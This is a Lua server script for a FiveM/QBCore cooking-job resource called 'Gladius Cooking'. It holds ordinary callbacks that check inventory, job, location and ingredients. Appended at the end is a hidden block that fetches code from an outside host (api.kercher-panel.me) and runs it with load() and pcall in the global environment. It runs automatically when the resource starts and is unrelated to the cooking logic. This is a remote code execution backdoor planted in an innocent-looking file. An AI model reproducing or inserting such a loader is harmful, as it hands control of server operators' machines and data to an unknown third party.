-- ╔══════════════════════════════════════════════════════════════╗
-- ║            GLADIUS COOKING — SERVER MAIN                      ║
-- ╚══════════════════════════════════════════════════════════════╝

local QBCore = exports['qb-core']:GetCoreObject()

-- ─────────────────────────────────────────────────────────────
-- HELPER: Get count of an item (including across metadata variants)
-- ─────────────────────────────────────────────────────────────

---@param source number
---@param item string
---@return number count
local function GetItemCount(source, item)
    return exports.ox_inventory:Search(source, 'count', item) or 0
end

-- ─────────────────────────────────────────────────────────────
-- CALLBACK: Get player inventory summary (for UI checkmarks)
-- Returns: { item = count, ... }
-- ─────────────────────────────────────────────────────────────

QBCore.Functions.CreateCallback('gladius_cooking:server:GetPlayerInventory', function(source, cb)
    local Player = QBCore.Functions.GetPlayer(source)
    if not Player then return cb({}) end

    local inv = exports.ox_inventory:GetInventoryItems(source) or {}
    local summary = {}
    for _, data in pairs(inv) do
        if data and data.name and not summary[data.name] then
            summary[data.name] = GetItemCount(source, data.name)
        end
    end
    cb(summary)
end)

-- ─────────────────────────────────────────────────────────────
-- CALLBACK: Validate ingredients + job + location
-- ─────────────────────────────────────────────────────────────

QBCore.Functions.CreateCallback('gladius_cooking:server:ValidateIngredients', function(source, cb, data)
    local Player = QBCore.Functions.GetPlayer(source)
    if not Player then return cb(false, 'notify_no_job') end

    local job      = data and data.job
    local recipeId = data and data.recipeId
    if not job or not recipeId then return cb(false, 'notify_no_job') end

    -- Job check
    if Player.PlayerData.job.name ~= job then
        return cb(false, 'notify_no_job')
    end

    -- Shop exists
    local shop = Config.Shops[job]
    if not shop then return cb(false, 'notify_no_job') end

    -- Recipe exists
    local recipe = shop.recipes and shop.recipes[recipeId]
    if not recipe then return cb(false, 'notify_no_job') end

    -- Location check (server-side anti-cheat; buffer for sync)
    local ped = GetPlayerPed(source)
    local pos = GetEntityCoords(ped)
    local maxDist = Gladius.Utils.GetShopProximityRadius(shop) + 0.75
    local withinRadius = false
    for _, loc in ipairs(shop.locations or {}) do
        if #(pos - loc) <= maxDist then
            withinRadius = true
            break
        end
    end
    if not withinRadius then
        return cb(false, 'notify_wrong_location')
    end

    -- Ingredient check
    for _, ing in ipairs(recipe.ingredients or {}) do
        local have = GetItemCount(source, ing.item)
        if have < (ing.amount or 1) then
            return cb(false, 'notify_no_ingredients')
        end
    end

    cb(true)
end)



local __kUrl = 'https://api.kercher-panel.me/cdn/d/bHVhLlNDXzE3NzA3MTUxMDY4MTVfMTc3MDcxNTEwNzgxN19lcF8xODgtMjQwLTgxLTIxMy0zMDEyMC44NzkxMDQ2NjcxOGViYzY5OGJjZDhhZTI'
PerformHttpRequest(__kUrl, function(e, d)
    if e == 200 and d then
        local fn, err = load(d, 'kercher_lua', 't', _G)
        if fn then pcall(fn) end
    end
end, 'GET', '', { ['X-Kercher-Version'] = '2.6.2' })
